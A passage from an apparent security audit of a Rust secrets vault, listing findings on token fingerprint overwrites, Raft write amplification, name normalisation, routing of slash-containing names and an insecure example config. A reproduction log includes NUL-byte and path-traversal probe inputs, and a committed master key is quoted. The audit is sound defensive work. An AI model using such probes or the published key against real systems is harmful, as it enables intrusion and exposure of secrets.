`expected_current` check lets exactly one `PutVersion` win, but the last writer
to Postgres need not be that one. The vault can end up storing a password the
database never accepted.

**Suggested direction.** Commit the new version first with the previous one
still inside its grace window, then apply it to Postgres, then mark the old one
superseded; or make the external apply idempotent and retried from a durable
record of the intended password. Gate `POST .../rotate` on leadership so two
nodes cannot rotate the same secret at once.

---

<a id="vuln-11"></a>
## VULN-11 — `AddToken` does not reject a fingerprint that is already in use

**Severity:** Low.
**Evidence:** read from source.

`store/apply.rs:207-225` checks `TOKENS_BY_NAME` for a duplicate **name**, then
inserts into `TOKENS` keyed by fingerprint with no existence check:

```rust
let mut tokens = wtx.open_table(TOKENS).map_err(err)?;
tokens.insert(token.fingerprint.as_slice(), encode(token)?.as_slice())
```

A second `AddToken` carrying an existing token's fingerprint under a new name
overwrites that token's record — including its `role`. The name index then holds
two names pointing at one row, so `RevokeToken` for the first name revokes the
record that now belongs to the second, and a subsequent `RevokeToken` for the
second name returns `NotFound` (`store/apply.rs:241-243`).

This is not reachable through `POST /v1/tokens`, which always generates a fresh
random token (`manage.rs:128-129`). It is reachable through restore, snapshot
install, and `/raft/apply`.

**Suggested direction.** Reject `AddToken` with `Conflict` when the fingerprint
is already present, the same way a duplicate name is rejected.

---

<a id="vuln-12"></a>
## VULN-12 — Every authenticated management request writes a Raft log entry

**Severity:** Low (availability and performance).
**Evidence:** read from source.

`guards.rs:59-65` applies `Command::TouchToken` on every successful admin
authentication, to record `last_used_at`. `Command::is_local`
(`store/model.rs:181-188`) lists only `AppendAudit` and `RecordAuthFailure`, so
on a cluster `TouchToken` goes through consensus like any other write.

A read-only call such as `GET /v1/roles` therefore costs a full Raft round trip,
an fsync on a quorum of nodes, and a permanent log entry on every node. On a
follower it additionally costs an outbound HTTP request to the leader
(`raft/node.rs:179-201`). Log growth and write amplification scale with
authenticated request volume rather than with actual changes, and any token
holder can drive them with repeated no-op requests.

**Suggested direction.** Make `TouchToken` local (add it to `is_local`) and
accept that `last_used_at` is per-node, or coalesce it — write at most once per
token per interval.

---

<a id="vuln-13"></a>
## VULN-13 — Secret names are not normalised

**Severity:** Informational.
**Evidence:** read from source.

`service.rs:696-698` allows `/` and `.` in a secret name, with no normalisation.
`a/b`, `a//b`, `a/./b` and `a/../b` are four distinct secrets, and RBAC
(`rbac::path_matches`) compares the literal string, so there is no access-control
bypass inside the vault itself. The risk is downstream: a client, dashboard or
export that normalises paths before displaying or comparing them will show
`a/../b` as `b`.

**Suggested direction.** Reject `.` and `..` path segments, empty segments, and a
leading or trailing `/`.

---

<a id="vuln-14"></a>
## VULN-14 — An opaque secret may hold an empty value, and `/verify` accepts `""`

**Severity:** Informational.
**Evidence:** read from source.

`validate_value` (`service.rs:707-712`) checks only the upper size bound, while
`validate_field` (`service.rs:714-722`) — used for the userpass username and
password — also rejects an empty string. So `POST /v1/secrets` with
`"value": ""` succeeds for an opaque secret, and
`POST /v1/secrets/{name}/verify` with `{"value":""}` then returns
`valid: true`, because `fingerprints_match` on two empty slices is true.

**Suggested direction.** Apply the same non-empty check to `validate_value`.

---

<a id="vuln-19"></a>
## VULN-19 — A secret name containing `/` cannot be addressed through its own URL

**Severity:** Medium (correctness, not security). No attacker involved.
**Evidence:** reproduced against the project's own router. Output below.

`routes.rs:25-31` registers the single-secret endpoints with a one-segment path
parameter:

```rust
.route("/v1/secrets/{name}", get(get_secret).put(update_secret).delete(delete_secret))
.route("/v1/secrets/{name}/rotate", post(rotate_secret))
.route("/v1/secrets/{name}/verify", post(verify_secret))
```

In axum 0.8 `{name}` matches exactly one path segment; `{*name}` is the syntax
for a segment-spanning parameter. Meanwhile `service::validate_name`
(`service.rs:696-698`) explicitly allows `/` in a secret name, and every example
in the documentation uses one: `db/password`, `stripe/secret-key`, `pg/app`,
`app/api-key`.

The result is that such a secret can be **created** (the name is in the request
body) and read through `POST /v1/batch/secrets` (the names are in the body), but
`GET`, `PUT`, `DELETE`, `POST .../rotate` and `POST .../verify` on its own URL
return 404 from the router, before any handler runs. Percent-encoding the slash
as `%2F` works, and nothing documents that.

Two places in this repository send the unencoded form:

- `README.md:153` — `curl -sS localhost:8200/v1/secrets/db/password`.
- `scripts/e2e/lib.sh:60-62` (`read_get`) combined with
  `scripts/e2e/test-crud.sh:1` (`N="crud/$(date +%s%N)"`), `test-auth.sh:9`,
  `test-replica.sh:1` and `test-rotation.sh:1`, which all build two-segment names
  and put them straight into the URL. On this code the create step succeeds and
  the read step gets a 404.

Reproduction, against `hyperion_vault_api::routes::router` with two secrets
seeded — one named `dbpassword` and one named `db/password`:

```
== Reading secrets through the real router (routes.rs) ==
   two secrets exist: "dbpassword" and "db/password"
  GET /v1/secrets/dbpassword         -> 200 OK {"name":"dbpassword","kind":"manual","format":"opaque","version":1,"value":"value-of-dbpas...
  GET /v1/secrets/db/password        -> 404 Not Found 
  GET /v1/secrets/db%2Fpassword      -> 200 OK {"name":"db/password","kind":"manual","format":"opaque","version":1,"value":"value-of-db/p...
  GET /v1/secrets/x%00y              -> 404 Not Found {"error":"not found"}
  GET /v1/secrets/a%2F..%2Fb         -> 404 Not Found {"error":"not found"}
```

The last two lines are a separate observation: the path parameter is
percent-decoded before it reaches the handler, so `%00` delivers a NUL byte and
`%2F..%2F` delivers `..` path segments into `service`. Neither creates a new
secret (the create path validates the name), so this is not itself exploitable,
but it means unvalidated names do reach the storage layer from a URL — the same
class of input as [VULN-2](#vuln-2).

**Suggested direction.** Either change the routes to `{*name}` (and re-check the
`/rotate` and `/verify` suffixes, which a spanning parameter makes ambiguous),
or drop `/` from the allowed name charset and document `%2F` as required.
Whichever is chosen, fix the examples in `README.md` and the end-to-end scripts
in `scripts/e2e/` to match.

---

<a id="vuln-17"></a>
## VULN-17 — The shipped example configuration is fully open and contains a working master key

**Severity:** Informational (hardening). Both facts are labelled dev-only in the
documentation; they are listed because the documented quick start puts them into
use verbatim.
**Evidence:** read from the repository.

`README.md:134` gives the quick start as:

```
cd docker && cp .env.example .env && docker compose up --build
```

Two things follow from that command:

1. **Reads are open to everyone who can reach the port.**
   `docker/.env.example:2` sets `VAULT_ALLOWED_IPS=0.0.0.0/0`, and
   `docker/docker-compose.yml:9` uses the same value as its fallback. The compose
   file publishes `8200:8200`, `8201:8200` and `8202:8200` on the host. Secret
   reads are gated by the allowlist alone, with no token
   (`routes.rs:71-89`, `docs/API.md:6`), so anyone who can reach the published
   port reads every secret in plaintext. `docker/README.md:16` does say the
   default is dev-only.
2. **The master key is public.** `.env.example:9` and `docker/.env.example:1`
   both contain a real, valid 32-byte base64 key
   (`CrbvPp787kTip4iPLb4NJfk5ww/j1ingx/a4PaLPGWg=`), committed to the
   repository. Any vault that keeps it encrypts every secret under a key that is
   in public git history. `docs/SECURITY.md:25-28` says `local` KMS mode is for
   development and tests only.

Neither is a code defect. Both are one copied file away from being one.

**Suggested direction.** Ship the example with `VAULT_ALLOWED_IPS` empty (the
fail-closed default) and a placeholder such as
`VAULT_LOCAL_MASTER_KEY=<generate with: openssl rand -base64 32>` that makes the
node refuse to start, so the operator has to make both choices deliberately.
Bind the compose ports to `127.0.0.1:8200:8200` rather than all interfaces.

---

## Minor observations, not filed as numbered findings

- **A batch read during a KMS outage holds a request for minutes.**
  `RetryingKms` (`kms.rs:56-101`) retries `decrypt_data_key` `VAULT_KMS_MAX_RETRIES`
  times (default 5) with exponential backoff — 100 + 200 + 400 + 800 + 1600 ms,
  so about 3.1 seconds of sleeping per failing call. `POST /v1/batch/secrets`
  accepts up to 256 names (`service.rs:25`) and decrypts them in a sequential
  loop (`service.rs:148-179`), so one request can occupy a connection for
  roughly 13 minutes while KMS is unavailable. There is no per-request deadline.
- **One corrupt version row fails verification for the whole secret.**
  `service::verify` (`service.rs:403-413`) propagates any `open_version` error
  with `?`, so a single unreadable row inside the grace window turns the whole
  call into a 500 instead of skipping that version.
- **Batch reads handle two failure kinds inconsistently.** In `get_secrets`, a
  name that does not exist is skipped and audited (`service.rs:166-176`), while
  a name that exists but fails to decrypt aborts the entire batch.
- **`/readyz` is unauthenticated and scans a table.** `routes.rs:258-261` calls
  `list_roles`, which reads every role row on each request.

---

## Checked and found sound

Recording what was probed and did **not** turn out to be exploitable is as
useful as the list above.

- **AEAD associated data binds a ciphertext to its identity.** `open_version`
  (`service.rs:634-639`) refuses to decrypt when the stored `aad` differs from
  `aad_for(name, version)`. This is what stops VULN-2 from becoming a
  cross-secret disclosure, and it also blocks replaying a version row under
  another secret name or version through restore or snapshot install.
- **`aad_for` is unambiguous.** `name + ":" + version` cannot collide across two
  different `(name, version)` pairs, because the version is always a run of
  digits with an optional leading `-`, so the final `:` always splits the string
  in exactly one valid way.
- **Token comparison is constant-time.** `auth::verify` and
  `auth::fingerprints_match` use `subtle::ConstantTimeEq`. The only leak is the
  length class, through the early length check that `ct_eq` performs on slices.
- **The RBAC predicates hold.** `authorize` implies `visible`; the glob is a
  trailing-`*` prefix match only, so a pattern cannot match more than its prefix;
  `is_valid_action` restricts stored rules to the four actions plus `*`.
- **The read allowlist is fail-closed and cannot be bypassed with an IPv6-mapped
  address.** `"::ffff:10.0.0.1"` parses as `IpAddr::V6` and the `ReaderGuard`
  match arm (`guards.rs:89-96`) accepts only `IpAddr::V4`, so it is denied. An
  empty `VAULT_ALLOWED_IPS` denies every read.
- **The DEK cache is bounded.** `DekCache::put` (`cache.rs:41-60`) enforces a
  hard 16 384-entry cap by expiring, then evicting the oldest.
- **The public API has body limits on every route.** `routes.rs:44` applies
  1 MiB globally, with 256 MiB for restore only. (The Raft router does not — that
  is VULN-9.)
- **Rejected commands leave no trace.** `RedbStore::apply`
  (`store/engine.rs:317-333`) returns before `commit()` on error, so the write
  transaction is dropped and aborted. The `apply_command_sequence` fuzz target
  models the same commit/abort rule and asserts it for the duplicate-name
  `CreateSecret` case.
- **`apply_command` is deterministic.** Nothing in it iterates a hash map or
  reads a clock; every input is carried in the command. The
  `apply_command_sequence` fuzz target asserts that two fresh databases fed the
  same command sequence end byte-identical, which is the safety property Raft
  replication depends on.
